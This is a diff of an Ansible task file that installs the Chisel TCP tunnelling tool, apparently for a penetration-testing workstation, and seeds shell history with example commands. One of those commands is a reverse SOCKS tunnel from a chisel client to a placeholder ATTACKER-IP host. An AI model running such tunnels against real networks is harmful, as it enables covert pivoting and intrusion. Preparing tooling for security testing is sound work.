@@ -1,0 +1,22 @@
+---
+- name: Install Chisel, Go based TCP tunnel
+  ansible.builtin.shell:
+    cmd: |
+      export PATH="/opt/tools/bin:$PATH"
+
+      asdf exec go install -v github.com/jpillora/chisel@latest
+      asdf reshim golang
+  args:
+    creates: "{{ target_user_home }}/.asdf/shims/chisel"
+  become: yes
+  become_user: "{{ target_user }}"
+
+- name: Add chisel history commands
+  ansible.builtin.copy:
+    dest: "{{ target_user_home }}/.zsh_history.d/chisel.history"
+    content: |
+      chisel server -p PORT --socks5 --reverse                                                                                                                │
+      chisel client ATTACKER-IP:ATTACKER-PORT R:PORT:socks
+    mode: '0644'
+    owner: "{{ target_user }}"
+    group: "{{ target_user }}"
